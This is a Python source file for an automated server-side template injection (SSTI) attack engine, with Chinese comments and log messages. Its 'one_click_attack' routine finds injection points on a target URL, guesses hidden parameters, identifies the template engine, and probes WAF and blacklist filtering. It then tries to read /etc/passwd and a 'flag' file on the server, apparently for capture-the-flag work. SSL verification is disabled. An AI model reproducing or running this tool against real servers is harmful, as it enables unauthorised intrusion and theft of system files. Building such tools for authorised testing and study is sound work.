import urllib.parse

import requests
import urllib3

from proj.engine.file_read import FileReadMixin
from proj.engine.filters import FiltersMixin
from proj.engine.template_detect import TemplateDetectMixin
from proj.engine.http_client import HttpClientMixin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SSTIEngine(HttpClientMixin, TemplateDetectMixin, FiltersMixin, FileReadMixin):
    """基於封包特徵分析的智能 SSTI 檢測引擎"""

    def __init__(self, proxy=None, timeout=15, verify_ssl=False):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.timeout = timeout
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.reset_state()

    def reset_state(self):
        self.detected_engine = None
        self.detected_confidence = 0
        self.filters = {}
        self.scanning = True
        self.discovered_injection_points = []
        self.baseline_response = {}  # 儲存基準回應
        self.findings = []

    def one_click_attack(self, url, delay, log_cb, result_cb, filter_cb):
        self.reset_state()
        log_cb("=" * 60)
        log_cb("SSTI 掃描開始 (模板偵測 + WAF偵測 + 讀檔搜尋)")
        log_cb(f"目標: {url}")
        log_cb("=" * 60)

        points = self.auto_discover(url, log_cb)
        if not points:
            log_cb("[-] 未發現任何注入點")
            return False

        log_cb("[Step 1/3] 模板偵測...")
        engine, conf, point, details = self.detect_template(points, log_cb)

        # 既有參數（例如 mode=preview）全部測完仍未命中時，補上 COMMON_GET_PARAMS
        # 猜測參數重試一輪——auto_discover 只在 URL 完全沒有 query string 時才會
        # 自動猜測（見 http_client.py），若 URL 帶了控制流程走向的既有參數、但
        # 真正的注入參數（如 name）根本不在 URL 上，第一輪永遠測不到它。
        # 傳入原始 url（而非清空 query 的 base_url）：guess_get_param_points
        # 會保留既有參數只疊加猜測參數，若改傳 base_url，mode=preview 這類
        # 伺服器要求必存在才放行的參數會遺失，猜測 point 會全部先被伺服器
        # 攔在模板渲染之前，跟猜測參數名對不對無關。
        if not engine and urllib.parse.urlparse(url).query:
            guess_points = self.guess_get_param_points(url)
            self.discovered_injection_points.extend(guess_points)
            engine, conf, point, details = self.detect_template(guess_points, log_cb)

        if not engine:
            log_cb("[-] 未檢測到 SSTI，掃描終止")
            return False
        self.detected_engine = engine
        self.detected_confidence = conf
        ptype, purl, pmethod, pdata, pdesc = point
        log_cb(f"[+] 識別引擎: {engine} (信心度: {conf})")
        log_cb(f"[+] 有效注入點: {pdesc} @ {purl} [{pmethod}]")

        log_cb("[Step 2/3] 自動探測 WAF/黑名單過濾...")
        filters, level = self.detect_filters(point, engine)
        log_cb(f"[*] 過濾強度: {level}/10")
        filter_cb(filters, level)
        for k, v in filters.items():
            log_cb(f"    {'BLOCKED' if v else 'OK'} {k}")
        result_cb({'phase': '模板偵測', 'chain': engine, 'cmd': '', 'status': f'信心度 {conf}, 過濾強度 {level}/10', 'output': '', 'raw': ''})

        log_cb("[Step 3/3] 自動尋找 /etc/passwd 與 flag ...")
        if engine not in self.FILE_READ_PAYLOADS:
            log_cb(f"[-] {engine} 尚無讀檔 payload，跳過")
        else:
            findings = self.search_flag_and_passwd(point, engine, log_cb, result_cb, level=level)
            self.findings = findings

        log_cb("=" * 60)
        log_cb("掃描完成")
        return True
